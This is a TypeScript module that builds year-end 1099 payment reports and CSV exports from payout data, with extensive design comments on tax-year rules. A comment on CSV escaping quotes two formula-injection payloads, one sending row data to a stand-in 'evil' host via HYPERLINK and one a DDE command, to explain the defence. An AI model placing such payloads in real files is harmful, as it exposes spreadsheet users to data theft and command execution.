/**
 * Year-end payment reporting — the data behind a 1099.
 *
 * PURE. No database, no clock, no environment. The DB reads live in
 * `report-1099-query.ts`, same split as `statement.ts` / `statement-query.ts`
 * and for the same reason: the rules about what counts as "paid in 2026" are
 * the part that has to be arguable line by line, and they are much easier to
 * argue when nothing here can reach a table.
 *
 * ============================================================
 * WHAT THIS IS, AND — MORE IMPORTANTLY — WHAT IT IS NOT
 * ============================================================
 *
 * This does NOT file a 1099 and does not claim to. It is the tenant's own
 * record of what they paid each contributor in a calendar year: the figure
 * their accountant files from, and the figure they reconcile Stripe's own
 * reporting against.
 *
 * That framing follows from ratified decision #1. Funds never pass through an
 * account we control — transfers are instructed against the TENANT's connected
 * Stripe account — so Stripe issues tax forms under the tenant's platform
 * account, not ours. We are not the payer of record and must never imply we
 * are. What the tenant needs from us is the number, itemised, with the rules
 * that produced it written down.
 *
 * ⚠️ THERE IS NO TIN, SSN OR EIN IN THIS EXPORT, AND THAT IS DELIBERATE.
 * `contributorIdentities` has no column for one. Tax identity is collected by
 * Stripe during Connect onboarding and stays with Stripe (§5 #14). Adding a TIN
 * column here would turn a revenue-split system into a system holding the most
 * regulated identifier a US person has, with the breach-notification and
 * retention obligations that attach to it — for no gain, because the party that
 * files the form already has it. If a customer asks for TINs in the export, the
 * answer is that they come from Stripe's tax reporting, not from us.
 *
 * ============================================================
 * THE SIX RULES THAT DECIDE WHAT LANDS IN A YEAR
 * ============================================================
 *
 * 1. CASH BASIS. A 1099 reports what was PAID during the calendar year, not
 *    what was earned. So this sums PAYOUTS, never ledger allocations. Someone
 *    who earned $5,000 in December and was paid on 4 January belongs on the
 *    FOLLOWING year's form. Reporting earnings instead is the single most
 *    common way these come out wrong, and it is wrong in the direction that
 *    causes a contributor's return not to match what the IRS was told.
 *
 * 2. ONLY MONEY THAT ACTUALLY MOVED. `status = 'paid'` and nothing else.
 *    Pending and processing payouts have not left; failed and cancelled ones
 *    never will. A failed payout that is later retried gets `completedAt`
 *    stamped at the retry, so it counts exactly once, in the year the money
 *    actually moved — which is the year it belongs in.
 *
 * 3. THE RESERVE IS NOT PAID. `payouts.amountMinor` is already the transferred
 *    amount; `reserveHeldMinor` is withheld alongside it and stays in the
 *    contributor's balance. Summing the two would report money the person
 *    never received. A unit test pins this, because the two columns sit next to
 *    each other and one day somebody will add them up.
 *
 * 4. A CLOSED YEAR IS NEVER RESTATED. If a customer refunds in March 2027 and
 *    the clawback recoups against a later payout, that reduces the 2027 figure —
 *    it does NOT reach back and reduce 2026. The 2026 money was genuinely
 *    received. Restating a year somebody has already filed against is a
 *    corrected 1099, which is an accountant's decision and a paper process, not
 *    something this should do silently. The consequence is a real one and is
 *    surfaced on screen rather than buried: a clawback can make a contributor's
 *    reported total exceed what they ended up keeping.
 *
 * 5. THE YEAR BOUNDARY IS UTC, AND IT IS SHOWN. `completedAt` is stored in UTC
 *    and the window is [Jan 1 00:00Z, Jan 1 next year 00:00Z). Every other date
 *    in this system is rendered in UTC for the same reason (see
 *    `client/src/lib/portal-date.ts`): a statement, an email and an export that
 *    disagree by a day look like a discrepancy worth disputing. The honest
 *    consequence is that a payout run at 19:00 US Eastern on 31 December falls
 *    in the NEXT tax year. The window is printed on the report so the figure can
 *    always be explained, and a tenant who needs local-midnight boundaries needs
 *    a per-tenant timezone — a real feature, not a tweak here.
 *
 * 6. AN ADVANCE COUNTS IN THE YEAR IT WAS ISSUED, AND RECOUPMENT NEVER TAKES IT
 *    BACK (§10b). An advance is cash the contributor received, so rule 1 puts it
 *    in the year the money left. What happens afterwards does NOT restate it:
 *    recouping an advance out of later earnings is not a repayment, it is the
 *    reason a later payout is smaller — and that smaller payout is already what
 *    the later year reports. Counting the recoupment as well would deduct the
 *    same dollar twice, once from a year that was probably already filed.
 *
 *    Two consequences worth being able to explain out loud. A contributor can
 *    have a reportable year with no transfers at all, if they took an advance
 *    and earned nothing — so an advance-only row is a real row and has no payout
 *    dates. And a written-off advance still counts: the person kept the money. A
 *    CANCELLED advance does not, because cancelling asserts no money ever left,
 *    which is why it is refused once anything has been recouped against it.
 *
 * ============================================================
 * THRESHOLDS ARE REPORTED, NEVER ENFORCED
 * ============================================================
 *
 * `REPORTING_THRESHOLD_MINOR` is the federal 1099-NEC threshold ($600). Rows
 * below it are FLAGGED, never dropped. Three reasons, all of which have bitten
 * real payroll exports:
 *
 *   - State thresholds differ from the federal one and several are lower.
 *   - The federal figure has moved before and will move again; a filter is a
 *     silent wrong answer the year after it changes.
 *   - The tenant's accountant is the one who decides. A row they can ignore
 *     costs nothing; a row that was never shown to them cannot be recovered.
 *
 * So the export is complete and the threshold is a column.
 */

/** Federal 1099-NEC reporting threshold, in minor units. Advisory — see above. */
export const REPORTING_THRESHOLD_MINOR = 60000n;

/**
 * Why a row may need the owner's attention before it is filed.
 *
 * Ordered by how much trouble it causes if ignored. These are warnings on a
 * row, never reasons to omit it — an unreportable-looking row that is silently
 * dropped is exactly the row somebody needed to see.
 */
export type TaxRowFlag =
  /** Paid, but no tax form has been collected. Nobody can file this as it stands. */
  | "no_tax_form"
  /** A W-8BEN is on file: a non-US person, who gets a 1042-S rather than a 1099. */
  | "foreign_person"
  /** Stripe rejected the identity. Treated as harder than "not collected" — it was tried. */
  | "invalid_tax_identity"
  /** Below the federal threshold. Informational; state rules may still require it. */
  | "below_threshold"
  /** Not USD. Never added into a USD total. */
  | "non_usd";

export interface TaxYearRow {
  contributorId: string;
  name: string;
  email: string | null;
  /** Stripe's id for the connected account the money went to. The reconciliation key. */
  stripeAccountId: string | null;
  taxFormType: string | null;
  taxIdentityStatus: string;
  currency: string;
  /** Total actually transferred in the year, in minor units. Excludes advances. */
  paidMinor: bigint;
  /** Advances issued in the year (§10b rule 6). Cash received, kept separate. */
  advanceMinor: bigint;
  /** `paidMinor + advanceMinor`. What the person actually received. */
  totalReceivedMinor: bigint;
  /** How many transfers make it up. A single large figure invites "from what?". */
  payoutCount: number;
  /** Null when the year contains advances but no transfers. */
  firstPaidAt: Date | null;
  lastPaidAt: Date | null;
  flags: TaxRowFlag[];
}

export interface TaxYearReport {
  year: number;
  /** Inclusive start of the window, UTC. */
  from: Date;
  /** EXCLUSIVE end of the window, UTC. Half-open so no payout lands in two years. */
  until: Date;
  rows: TaxYearRow[];
  /** Per-currency totals. Never summed across currencies — a 1099 is a USD form. */
  totalsByCurrency: { currency: string; totalMinor: bigint; rowCount: number }[];
  /** Rows at or over the federal threshold, in USD. What an accountant asks for first. */
  reportableRowCount: number;
  /** Rows paid something with no usable tax identity. The actionable number. */
  missingTaxFormCount: number;
  /**
   * DISTINCT people paid, which is NOT `rows.length`.
   *
   * A contributor paid in two currencies is two rows, by design — a dollar
   * total must never absorb a pound. But "5 people paid" when four people were
   * paid is a number an owner will check against their own records and find
   * wrong, and the first thing they will then distrust is the total next to it.
   * Found by loading the screen; the row count was being labelled as people.
   */
  contributorCount: number;
}

/**
 * The half-open UTC window for a calendar year.
 *
 * Half-open on purpose: with an inclusive end you either lose the final second
 * of the year or double-count a payout stamped exactly at midnight, and both
 * failures are invisible until someone reconciles by hand in April.
 */
export function taxYearWindow(year: number): { from: Date; until: Date } {
  if (!Number.isInteger(year) || year < 2000 || year > 2200) {
    throw new RangeError(`Not a usable tax year: ${year}`);
  }
  return {
    from: new Date(Date.UTC(year, 0, 1, 0, 0, 0, 0)),
    until: new Date(Date.UTC(year + 1, 0, 1, 0, 0, 0, 0)),
  };
}

/** Inputs to a row, before the flags are worked out. */
export interface TaxYearRowInput {
  contributorId: string;
  name: string;
  email: string | null;
  stripeAccountId: string | null;
  taxFormType: string | null;
  taxIdentityStatus: string | null;
  currency: string;
  paidMinor: bigint;
  /** Advances issued in the year. Omitted by callers that have none. */
  advanceMinor?: bigint;
  payoutCount: number;
  firstPaidAt: Date | null;
  lastPaidAt: Date | null;
}

/**
 * Work out the flags for one row.
 *
 * Split out and exported so the rules are testable without a database, and so
 * the reasons live in one place rather than being re-derived by the screen and
 * the CSV separately — a flag that differs between the two is a support call.
 */
export function flagsFor(input: TaxYearRowInput): TaxRowFlag[] {
  const flags: TaxRowFlag[] = [];
  const form = (input.taxFormType ?? "").toUpperCase();
  const status = input.taxIdentityStatus ?? "not_collected";
  // Measured on everything the person received, transfers and advances alike.
  // Testing transfers alone would mark a $10,000 advance and no sales as
  // "below threshold", which is both wrong and wrong in the expensive direction.
  const receivedMinor = input.paidMinor + (input.advanceMinor ?? 0n);

  if (form.startsWith("W-8") || form.startsWith("W8")) {
    // A non-US person is not a 1099 at all — it is a 1042-S, which is a
    // different form on a different deadline. Saying so is more useful than
    // silently including them in a 1099 count.
    flags.push("foreign_person");
  } else if (status === "invalid") {
    flags.push("invalid_tax_identity");
  } else if (status !== "collected") {
    flags.push("no_tax_form");
  }

  if (input.currency !== "USD") flags.push("non_usd");
  else if (receivedMinor < REPORTING_THRESHOLD_MINOR) flags.push("below_threshold");

  return flags;
}

/**
 * Assemble the report from rows the query produced.
 *
 * Deliberately does no arithmetic on individual payouts — the query has already
 * summed them, and re-deriving a total here would create a second place for the
 * figure to come from. Same discipline as `statement.ts`.
 */
export function assembleReport(
  year: number,
  inputs: TaxYearRowInput[]
): TaxYearReport {
  const { from, until } = taxYearWindow(year);

  const rows: TaxYearRow[] = inputs.map((input) => {
    const advanceMinor = input.advanceMinor ?? 0n;
    return {
      ...input,
      advanceMinor,
      totalReceivedMinor: input.paidMinor + advanceMinor,
      taxIdentityStatus: input.taxIdentityStatus ?? "not_collected",
      flags: flagsFor(input),
    };
  });

  // Largest first — the rows that matter most for filing are the ones an owner
  // wants to check, and an alphabetical list buries them. Sorted on the total
  // received, so an advance-heavy year does not sink to the bottom.
  rows.sort((a, b) => {
    if (a.currency !== b.currency) return a.currency < b.currency ? -1 : 1;
    if (a.totalReceivedMinor !== b.totalReceivedMinor) {
      return a.totalReceivedMinor > b.totalReceivedMinor ? -1 : 1;
    }
    return a.name.localeCompare(b.name);
  });

  const totals = new Map<string, { totalMinor: bigint; rowCount: number }>();
  for (const row of rows) {
    const current = totals.get(row.currency) ?? { totalMinor: 0n, rowCount: 0 };
    current.totalMinor += row.totalReceivedMinor;
    current.rowCount += 1;
    totals.set(row.currency, current);
  }

  return {
    year,
    from,
    until,
    rows,
    totalsByCurrency: [...totals.entries()]
      .map(([currency, t]) => ({ currency, ...t }))
      .sort((a, b) => a.currency.localeCompare(b.currency)),
    reportableRowCount: rows.filter(
      (row) => row.currency === "USD" && row.totalReceivedMinor >= REPORTING_THRESHOLD_MINOR
    ).length,
    missingTaxFormCount: rows.filter(
      (row) => row.flags.includes("no_tax_form") || row.flags.includes("invalid_tax_identity")
    ).length,
    contributorCount: new Set(rows.map((row) => row.contributorId)).size,
  };
}

// ============================================================
// CSV
// ============================================================

/**
 * Escape one CSV field.
 *
 * Two separate jobs, and the second one is a security control rather than a
 * formatting nicety:
 *
 * 1. ORDINARY CSV QUOTING. Quote when the value contains a comma, quote,
 *    newline or carriage return, doubling any embedded quote.
 *
 * 2. ⚠️ FORMULA INJECTION. A spreadsheet treats a cell beginning `=`, `+`, `-`,
 *    `@`, tab or CR as a FORMULA, not as text. Contributor names and emails are
 *    attacker-supplied in the only sense that matters — a tenant types them in,
 *    or an adapter imports them from a store — and this file is opened in Excel
 *    or Sheets by an accountant, on a machine with access to everything an
 *    accountant has access to. A name of `=HYPERLINK("http://evil/"&A1,"ok")`
 *    exfiltrates the row on click; `=cmd|'/c calc'!A0` is the DDE variant.
 *    Prefixing with an apostrophe forces the cell to text, which every
 *    spreadsheet honours and which no reader of the raw file misparses.
 *
 * Applied to EVERY field rather than only the ones that look risky, because
 * "which columns are user-controlled" is exactly the kind of fact that changes
 * quietly when a column is added.
 */
export function csvField(value: string): string {
  const dangerous = /^[=+\-@\t\r]/.test(value);
  const body = dangerous ? `'${value}` : value;
  if (/[",\n\r]/.test(body) || dangerous) {
    return `"${body.replace(/"/g, '""')}"`;
  }
  return body;
}

/** Minor units as a plain decimal, for a spreadsheet to parse. Never via `Number`. */
function decimal(amountMinor: bigint): string {
  const negative = amountMinor < 0n;
  const abs = negative ? -amountMinor : amountMinor;
  return `${negative ? "-" : ""}${abs / 100n}.${(abs % 100n).toString().padStart(2, "0")}`;
}

/**
 * `2026-08-02`, UTC, from an instant. Matches every other date this system prints.
 *
 * Null becomes an empty cell rather than a date, because a row can legitimately
 * have advances and no transfers (rule 6) and inventing a date for it would put
 * a payment on a day nothing was paid.
 */
function isoDate(value: Date | null): string {
  return value ? value.toISOString().slice(0, 10) : "";
}

/**
 * `advances_paid` and `total_received` are separate columns rather than one
 * merged figure. An accountant reconciling against Stripe will find the
 * transfers there and NOT the advances — those left the business by whatever
 * means the tenant used — so a single blended total looks like Stripe is
 * under-reporting. Two columns make the difference self-explaining.
 */
export const CSV_COLUMNS = [
  "contributor_id",
  "name",
  "email",
  "stripe_account_id",
  "tax_form_type",
  "tax_identity_status",
  "currency",
  "total_paid",
  "advances_paid",
  "total_received",
  "payout_count",
  "first_paid_on",
  "last_paid_on",
  "meets_federal_threshold",
  "flags",
] as const;

/**
 * Serialise the report as CSV.
 *
 * CRLF line endings and no leading BOM. CRLF is what RFC 4180 specifies and
 * what Excel expects; a lone LF is read as one long row by some older Windows
 * builds, which is a support call that looks like data loss.
 */
export function toCsv(report: TaxYearReport): string {
  const lines: string[] = [CSV_COLUMNS.join(",")];

  for (const row of report.rows) {
    lines.push(
      [
        row.contributorId,
        row.name,
        row.email ?? "",
        row.stripeAccountId ?? "",
        row.taxFormType ?? "",
        row.taxIdentityStatus,
        row.currency,
        decimal(row.paidMinor),
        decimal(row.advanceMinor),
        decimal(row.totalReceivedMinor),
        String(row.payoutCount),
        isoDate(row.firstPaidAt),
        isoDate(row.lastPaidAt),
        row.currency === "USD" && row.totalReceivedMinor >= REPORTING_THRESHOLD_MINOR
          ? "yes"
          : "no",
        row.flags.join(" "),
      ]
        .map(csvField)
        .join(",")
    );
  }

  return lines.join("\r\n") + "\r\n";
}

/**
 * The filename an owner sees in their downloads folder.
 *
 * Includes the tenant slug and the year because these files get emailed to an
 * accountant who may handle several businesses, and `export.csv` in an inbox is
 * indistinguishable from every other `export.csv`.
 */
export function csvFilename(tenantSlug: string, year: number): string {
  const safeSlug = tenantSlug.replace(/[^a-zA-Z0-9_-]/g, "") || "tenant";
  return `${safeSlug}-payments-${year}.csv`;
}
